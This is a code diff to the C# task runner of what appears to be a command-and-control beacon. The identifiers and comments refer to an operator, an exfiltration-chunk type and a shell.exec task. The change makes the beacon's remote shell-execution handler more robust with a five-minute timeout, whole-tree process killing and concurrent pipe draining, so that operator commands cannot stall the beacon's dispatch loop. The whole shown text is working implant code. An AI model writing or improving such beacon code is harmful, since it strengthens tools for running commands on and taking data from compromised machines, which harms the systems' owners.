@@ -109,9 +109,16 @@ internal sealed class Runner
         (TaskOutcome Outcome, string Output) result)
         => (result.Outcome, result.Output, Array.Empty<ExfilChunk>());
 
+    // The shell.exec task budget: a command that outlives it is killed so a
+    // hung task cannot block the beacon's dispatch loop indefinitely (dispatch
+    // runs synchronously on the beacon stream).
+    private static readonly TimeSpan ShellTimeout = TimeSpan.FromMinutes(5);
+
     // Runs the argument string through the platform shell and returns the combined
     // output. A non-zero exit is a Failed outcome with the output captured so the
-    // operator sees the cause; the shell itself failing to start is also Failed.
+    // operator sees the cause; the shell itself failing to start is also Failed;
+    // a command that outlives the task budget is killed whole-tree and reported
+    // as timed out.
     private static (TaskOutcome, string) ShellExec(string command)
     {
         var (shell, flag) = PlatformShell();
@@ -131,10 +138,23 @@ internal sealed class Runner
             using var process = Process.Start(psi);
             if (process is null)
                 return (TaskOutcome.Failed, "failed to start shell");
-            var stdout = process.StandardOutput.ReadToEnd();
-            var stderr = process.StandardError.ReadToEnd();
-            process.WaitForExit();
-            var output = ComposeOutput(stdout, stderr);
+
+            // Drain the pipes concurrently with the wait: a command that fills
+            // the pipe buffer while running blocks on write, so a synchronous
+            // ReadToEnd-before-WaitForExit would deadlock instead of timing out.
+            var stdout = process.StandardOutput.ReadToEndAsync();
+            var stderr = process.StandardError.ReadToEndAsync();
+
+            if (!process.WaitForExit((int)ShellTimeout.TotalMilliseconds))
+            {
+                process.Kill(entireProcessTree: true);
+                process.WaitForExit(5000);
+                return (TaskOutcome.Failed, $"shell.exec timed out after {(int)ShellTimeout.TotalMinutes} minutes");
+            }
+
+            // The process has exited, so both drains have completed (the pipes
+            // closed); the sync wait below never blocks.
+            var output = ComposeOutput(stdout.GetAwaiter().GetResult(), stderr.GetAwaiter().GetResult());
             if (process.ExitCode != 0)
                 return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
             return (TaskOutcome.Succeeded, output);
